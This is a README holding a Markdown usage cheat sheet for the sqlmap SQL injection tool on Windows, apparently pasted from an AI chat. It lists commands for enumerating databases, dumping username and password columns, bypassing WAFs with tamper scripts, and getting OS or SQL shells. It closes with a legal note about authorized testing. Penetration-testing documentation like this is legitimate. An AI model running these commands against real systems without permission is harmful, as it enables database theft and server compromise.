# SQLMAP-for-windows
sqlmap for windows operating system

Here’s a clean **SQLMap usage guide in Markdown format** — you can directly copy and use it anywhere:

---

# SQLMap Usage Guide

SQLMap is an open-source tool for detecting and exploiting SQL injection vulnerabilities in web applications.

---

## 🔹 Basic Syntax

```bash
sqlmap -u <URL> [options]
```

Example:

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

---

## 🔍 Basic Scanning

| Purpose                             | Command                         |
| ----------------------------------- | ------------------------------- |
| Simple test for SQL injection       | `sqlmap -u "URL"`               |
| Specify HTTP method (e.g., POST)    | `sqlmap -u "URL" --data="id=1"` |
| Provide full request from text file | `sqlmap -r request.txt`         |
| Crawl website to discover URLs      | `sqlmap -u "URL" --crawl=3`     |

---

## 🎯 Enumeration Options

```bash
sqlmap -u "URL" --dbs              # List databases
sqlmap -u "URL" -D testdb --tables # List tables
sqlmap -u "URL" -D testdb -T users --columns # Columns of a table
sqlmap -u "URL" -D testdb -T users -C username,password --dump # Extract specific data
sqlmap -u "URL" --current-user     # Current DB user
sqlmap -u "URL" --current-db       # Current database
```

---

## 🔐 Authentication Options

| Task                 | Command                                     |
| -------------------- | ------------------------------------------- |
| Add cookie           | `--cookie="PHPSESSID=xyz"`                  |
| Basic authentication | `--auth-type=basic --auth-cred="user:pass"` |
| Custom headers       | `--headers="User-Agent: Mozilla/5.0"`       |

---

## ⚙️ Tamper Scripts (Bypass WAF/Filters)

View tamper scripts:

```bash
sqlmap --list-tampers
```

Use tamper script:

```bash
sqlmap -u "URL" --tamper=space2comment
```

---

## 🧨 Exploitation

| Purpose            | Command         |
| ------------------ | --------------- |
| Get OS shell       | `--os-shell`    |
| Execute OS command | `--os-cmd="id"` |
| Open SQL shell     | `--sql-shell`   |

---

## 🚀 Performance & Automation

| Option               | Description            |
| -------------------- | ---------------------- |
| `--batch`            | No prompts, auto yes   |
| `--level=5 --risk=3` | Deep + aggressive scan |
| `--threads=10`       | Speed up by threading  |

Example:

```bash
sqlmap -u "URL" --batch --level=5 --risk=3 --threads=10
```

---

## 📁 Output Management

| Command               | Purpose                     |
| --------------------- | --------------------------- |
| `--output-dir=/path/` | Change save path            |
| `--flush-session`     | Clear previous session data |

---

## 📌 Example Combination

```bash
sqlmap -u "http://site.com/item.php?id=10" \
--cookie="PHPSESSID=abc123" \
--dbs --batch --threads=8
```

---

## ⚠️ Legal Note

> Use SQLMap **only on systems you own or have explicit permission to test**. Unauthorized usage is illegal.



